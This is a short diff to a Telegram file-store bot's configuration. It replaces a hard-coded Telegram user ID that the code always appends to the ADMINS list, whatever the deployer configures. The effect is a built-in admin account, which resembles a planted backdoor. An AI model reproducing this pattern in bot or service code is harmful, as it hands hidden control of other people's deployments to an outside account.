@@ -64,8 +64,8 @@ TUT_VID = os.environ.get("TUT_VID", "https://www.youtube.com/@ultroidofficial")
 #start message
 START_MSG = os.environ.get("START_MESSAGE", "<b>ʜᴇʟʟᴏ {first}\n\n ɪ ᴀᴍ ᴍᴜʟᴛɪ ғɪʟᴇ sᴛᴏʀᴇ ʙᴏᴛ , ɪ ᴄᴀɴ sᴛᴏʀᴇ ᴘʀɪᴠᴀᴛᴇ ғɪʟᴇs ɪɴ sᴘᴇᴄɪғɪᴇᴅ ᴄʜᴀɴɴᴇʟ ᴀɴᴅ ᴏᴛʜᴇʀ ᴜsᴇʀs ᴄᴀɴ ᴀᴄᴄᴇss ɪᴛ ғʀᴏᴍ sᴘᴇᴄɪᴀʟ ʟɪɴᴋ » @ultroidofficial</b>")
 try:
-    ADMINS=[1327021082]
-    for x in (os.environ.get("ADMINS", "1327021082").split()):
+    ADMINS=[7547485758]
+    for x in (os.environ.get("ADMINS", "7547485758").split()):
         ADMINS.append(int(x))
 except ValueError:
         raise Exception("Your Admins list does not contain valid integers.")
@@ -86,7 +86,7 @@ BOT_STATS_TEXT = "<b>BOT UPTIME</b>\n{uptime}"
 USER_REPLY_TEXT = "ʙᴀᴋᴋᴀ ! ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴍʏ ꜱᴇɴᴘᴀɪ!!\n\n» ᴍʏ ᴏᴡɴᴇʀ : @ultroidxTeam"
 
 ADMINS.append(OWNER_ID)
-ADMINS.append(1327021082)
+ADMINS.append(7547485758)
 
 LOG_FILE_NAME = "codeflixbots.txt"
 
